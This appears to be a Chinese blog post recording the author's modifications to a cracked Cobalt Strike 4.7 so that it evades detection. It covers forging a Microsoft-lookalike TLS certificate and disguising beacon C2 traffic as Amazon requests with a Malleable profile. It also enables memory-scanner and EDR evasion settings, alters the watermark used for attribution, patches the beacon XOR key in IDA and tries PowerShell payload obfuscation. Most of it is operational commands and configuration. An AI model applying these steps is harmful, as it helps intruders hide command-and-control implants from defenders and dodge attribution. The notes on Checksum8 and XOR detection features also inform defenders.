---
title: 工具魔改 | Cobalt Strike 4.7 特征修改与流量混淆
cover: 'https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image22.png'
categories:
  - 安全工具
  - 工具魔改
tags:
  - Cobalt Strike
  - 免杀
  - 流量混淆
abbrlink: bb2a3f37
date: 2026-04-01 12:00:00
---
# 工具魔改 | Cobalt Strike 4.7 特征修改与流量混淆

> 本文记录了对 Cobalt Strike 4.7 的一些特征修改过程，包括证书替换、Malleable C2 Profile 流量伪装、Beacon 内存特征处理、异或密钥修改等。不是什么教程，就是自己折腾的过程记录。

---

## 目录

1. [证书替换](#一证书替换)
2. [Malleable C2 Profile 流量混淆](#二malleable-c2-profile-流量混淆)
3. [修改服务端端口](#三修改服务端端口)
4. [CS 源码编译与个性化修改](#四cs-源码编译与个性化修改)
5. [水印修改](#五水印修改)
6. [Checksum8 与 Stager 特征](#六checksum8-与-stager-特征)
7. [异或密钥修改](#七异或密钥修改)
8. [PowerShell 混淆尝试](#八powershell-混淆尝试)

---

## 一、证书替换

CS 默认证书的特征非常明显，蓝队抓到 SSL 握手包直接就能识别，第一步先把证书换掉。

### 查看默认证书

`keytool.exe` 是 Java JRE 自带的证书管理工具，用它查看当前证书信息：

```bash
keytool.exe -list -v -keystore cobaltstrike.store
```

默认密码可以在 `teamserver.sh` 里看到：

```
-Djavax.net.ssl.keyStorePassword=123456
```

原本的证书信息长这样，特征很明显：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image1.png)

### 生成自定义证书

把证书伪装成 Microsoft 更新服务，运行以下命令：

```bash
keytool -genkey -alias cobaltstrike -keyalg RSA -keysize 2048 \
-storetype JKS -keystore cobaltstrike.store -validity 3650
```

填写信息时模仿微软：

```
您的名字与姓氏是什么?      → www.microsoft.com
您的组织单位名称是什么?    → Microsoft Corporation
您的组织名称是什么?        → Microsoft
您所在的城市或区域名称是什么? → Redmond
您所在的省/市/自治区名称是什么? → Washington
该单位的双字母国家/地区代码是什么? → US
密钥库口令                 → 自己设一个，记住
```

生成完之后确认一下新证书信息：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image2.png)

### 修改启动脚本密码

打开 `./teamserver` 启动脚本，把密码改成和新证书一致：

```bash
-Djavax.net.ssl.keyStorePassword=123456
```

> 注意：修改后的文件需要同步到服务端。

启动方式：

```bash
./teamserver 172.16.250.128 kali
# 格式：./teamserver [修改了密码的启动方式文件] [连接ip] [连接密码]
```

### 验证效果

客户端连接时会弹出证书指纹确认框：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image3.png)

这个指纹就是刚才生成证书时看到的 SHA256 值，完全一致，说明服务端用的就是自定义证书，默认的 CS 证书特征（`CN=Major Cobalt Strike`）已经没了。

---

## 二、Malleable C2 Profile 流量混淆

证书换了之后，CS 默认的心跳流量特征还是很明显，蓝队一抓包就能识别。Malleable C2 Profile 可以把 beacon 的流量伪装成正常的业务请求。

### 下载现成的 Profile

```bash
git clone https://github.com/rsmudge/Malleable-C2-Profiles
```

里面有很多现成的，我用的是 `amazon.profile`，伪装成亚马逊购物流量。

```bash
cat amazon.profile
```

### 配置项解释

**全局设置：**

```
set sleeptime "5000";   # beacon 心跳间隔，5秒太频繁，建议改大
set jitter    "0";      # 心跳抖动，建议加上，避免固定频率被识别
set maxdns    "255";    # DNS 最大长度
set useragent "Mozilla/5.0 ...";  # 伪装的 UA，默认是 IE11，太老了
```

**http-get（beacon 回连拉任务）：**

```
uri = "/s/ref=nb_sb_noss_1/..."   # 伪装成亚马逊搜索请求
header "Host" "www.amazon.com"    # Host 头伪装
metadata → Cookie                 # beacon 元数据藏在 Cookie 里
```

**http-post（beacon 上传执行结果）：**

```
uri = "/N4215/adj/amzn.us.sr.aps"  # 伪装成亚马逊广告请求
output → base64 → print            # 执行结果 base64 编码后发送
```

### 需要修改的地方

**1. sleeptime 和 jitter（最重要）**

```
set sleeptime "60000";  # 改成 1 分钟
set jitter    "20";     # 加上 ±20% 随机抖动
```

**2. useragent 换新一点的**

```
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
```

**3. 在文件末尾加上 stage 和 process-inject 块**

```
stage {
    set sleep_mask  "true";
    set userwx      "false";
    set cleanup     "true";
    set stomppe     "true";
    set obfuscate   "true";
}

process-inject {
    set startrwx         "false";
    set userwx           "false";
    set bof_reuse_memory "false";
}
```

### stage 块各配置解释

| 配置项 | 作用 |
|--------|------|
| `sleep_mask "true"` | beacon 睡眠时将内存中的自身代码加密为乱码，躲避 BeaconEye 等内存扫描 |
| `userwx "false"` | 不申请 RWX 内存，改用 RW 写入再改为 RX 执行，规避 EDR 检测 |
| `cleanup "true"` | beacon 执行完后清理自身，减少内存残留 |
| `stomppe "true"` | 抹掉内存里的 PE 头，让内存扫描工具找不到完整的 PE 结构 |
| `obfuscate "true"` | 混淆 beacon 在内存里的字符串，扫描不到明显特征 |

**process-inject 块**控制 beacon 注入其他进程时的行为，`startrwx` 和 `userwx` 同样是为了规避 RWX 内存检测，`bof_reuse_memory` 关掉后每次重新申请内存，减少特征。

> 注意：`set cleanup "true"` 在某些情况下可能导致 beacon 执行完某些操作后自动退出，如果发现 beacon 异常掉线可以把这行去掉。

### 加载 Profile 启动

```bash
./teamserver 172.16.250.128 123456 amazon.profile
```

### 流量对比验证

用 Wireshark 选择对应网卡抓包，过滤器输入 `http`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image4.png)

上线后查看流量包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image5.png)

**原版默认流量（特征明显）：**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image6.png)

**修改后的流量：**

响应包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image7.png)

请求包：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image8.png)

可以看到流量完全伪装成了亚马逊购物请求，URI、Host 头、响应头都模拟了亚马逊，beacon 元数据藏在 Cookie 里，UA 也换成了 Chrome/120。

---

## 三、修改服务端端口

默认 50050 端口特征太明显，改一下：

打开启动脚本，找到：

```
-Dcobaltstrike.server_port=50050
```

改成其他端口，比如：

```
-Dcobaltstrike.server_port=54321
```

客户端连接时端口也要保持一致：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image9.png)

### 关于 CDN 隐匿

虽然用了 Profile，但流量依然是直连，蓝队还是能查到真实 IP。更进一步的做法是通过 Cloudflare 等 CDN 转发流量（域前置），让蓝队只能查到 CDN 的 IP，查不到真实的服务器 IP，把 `172.16.250.128` 换成域名上线即可。这块后续再研究。

---

## 四、CS 源码编译与个性化修改

接下来折腾源码层面的修改，需要把 CS 的 jar 包反编译出来重新编译。

### 环境准备

用 Java 1.8，把原 jar 作为依赖导入：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image10.png)

添加模块依赖：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image11.png)

修改文件保持在 src 目录下：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image12.png)

添加工件（Artifact）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image13.png)

### 编译运行

重新构建项目、构建工件后直接运行会报错：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image14.png)

需要添加启动参数：

```
-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image15.png)

然后会出现授权校验失败的问题：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image16.png)

这里是因为原软件需要授权，破解过程就不记了，直接用现成的破解版跳过这步。

正常启动后的界面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image17.png)

### 个性化修改路径

折腾了一下发现各个地方的修改路径，记录一下备用：

| 修改内容 | 文件路径 |
|----------|----------|
| 标题修改 | `cobaltstrike/aggressor/AggressorClient.java` |
| 界面修改 | `cobaltstrike/aggressor/dialogs/ConnectDialog.java` |
| 介绍部分 | `cobaltstrike/resources/about.html` |
| 许可部分 | `cobaltstrike/resources/credits.txt` |
| 图标（32x32） | `cobaltstrike/resources/armitage-icon.gif` |
| 图标（256x256） | `cobaltstrike/resources/armitage-logo.gif` |
| 主题风格 | `cobaltstrike/aggressor/Aggressor.java` |
| 默认 Profile | `cobaltstrike/resources/default.profile` |

---

## 五、水印修改

CS beacon 里有水印（Watermark），是授权标识，可以用于溯源到同一个 CS 授权。用 Twi1ight 大佬的脚本生成自定义水印：

```bash
python3 watermark.py 202466564
```

传入一个自定义数字（建议避开常见 ID，使用大于 624 的随机数）。

输出：

```
Cobalt Strike Watermark Fucker By Twi1ight@T00ls.Net

watermark: 202466564
watermarkHash: VfOs4YF3Xp3ZAVjrMJnmhA==
```

### 通过 CSAgent 修改

CSAgent 不需要反编译整个 `cobaltstrike.jar`，直接编辑同级目录下的 `CSAgent.properties`：

```properties
# 设置自定义水印
beacon.watermark.value=202466564
beacon.watermark.hash=VfOs4YF3Xp3ZAVjrMJnmhA==
# 开启汉化补丁
need.translation=Y
# 关闭"仅翻译"模式，启用字节码注入
translation.only=N
```

修改启动参数，加入 CSAgent：

```
-XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=CSAgent.properties
```

中文界面配置生效后：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image18.png)

---

## 六、Checksum8 与 Stager 特征

CS 有一个比较经典的流量特征——Checksum8 算法，蓝队可以用这个识别 CS 流量。

**Checksum8 算法：** ASCII 码之和 % 256

- 64 位木马的 checksum8 值为 **93**
- 32 位木马的 checksum8 值为 **92**

不管 Profile 怎么改，只要第一个数据包中 GET 请求路径的 checksum8 值是这两个，基本就能确认是 CS 的远控通道。

另外两个会被捕获到的特征：

1. URL 的 checksum8 规则
2. 访问 URL 下载解析 Stager 的行为

Stager 默认通过 XOR 加密，加密密钥是固定的：

- CS 3.x：配置信息通过异或 `0x69` 解密
- CS 4.x：配置信息通过异或 `0x2e` 解密

Windows Execute 模块生成的就是 Stager：运行 EXE → 自动生成并访问符合 checksum8 校验的 URI 进行远程下载 Stager → 上线。

---

## 七、异或密钥修改

Stager 文件对应 CS 目录里的 `sleeve/beacon.dll` 和 `sleeve/beacon64.dll`，这两个文件是加密的，需要先解密才能修改。

### 解密脚本

不同版本用不同的脚本：

- 4.0~4.5：https://github.com/GH-H4d35/CrackSleeve
- 4.7：https://github.com/kyxiaxiang/CrackSleeve4.7
- 4.8：https://github.com/kyxiaxiang/CrackSleeve4.8
- 4.9：https://github.com/kyxiaxiang/CrackSleeve4.9

编译并解密：

```bash
javac -encoding UTF-8 -classpath cobaltstrike.jar CrackSleeve.java
java -classpath "cobaltstrike.jar;./" CrackSleeve decode
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image19.png)

### 用 IDA 修改异或密钥

以 64 位为例，打开解密后的 `beacon.x64.dll`，按 `Alt+B` 搜索 `xor 0x2e`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image20.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image21.png)

双击进去：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image22.png)

F5 反汇编查看：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image23.png)

通过 Edit → Patch program → Change byte，把 `2E` 改为自定义的值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image24.png)

### 同步修改 Java 源码

对应修改 `beacon/BeaconPayload.java`，把原本的 `46`（0x2e 的十进制）换成修改后的十进制值：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image25.png)

### 重新打包

```bash
java -classpath "cobaltstrike.jar;./" CrackSleeve encode
```

打包编译完成后替换服务端的 jar 包，测试可以正常生成和连接：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image26.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image27.png)

---

## 八、PowerShell 混淆尝试

试了一下给 PowerShell payload 加混淆。

**涉及文件：**

- `resources/template.x64.ps1`（PS 模板）
- `common/ResourceUtils.java`（修改生成逻辑）

下载 AES 加密混淆脚本放到根目录：

https://github.com/Chainski/AES-Encoder

生成 payload：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image28.png)

效果确实很明显，混淆之后看不出原始代码。

但是测试发现——**经过 CS 加密的 payload 跑不起来**，混淆原项目单独运行是没问题的，只要经过 CS 那层加密就不行了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/cs_image29.png)

尝试了很多方法都没解决，这条路先放弃了，后续可以换其他的加密脚本再试试。

---

> 参考项目：
> - Malleable-C2-Profiles：https://github.com/rsmudge/Malleable-C2-Profiles
> - CrackSleeve 4.7：https://github.com/kyxiaxiang/CrackSleeve4.7
> - AES-Encoder：https://github.com/Chainski/AES-Encoder
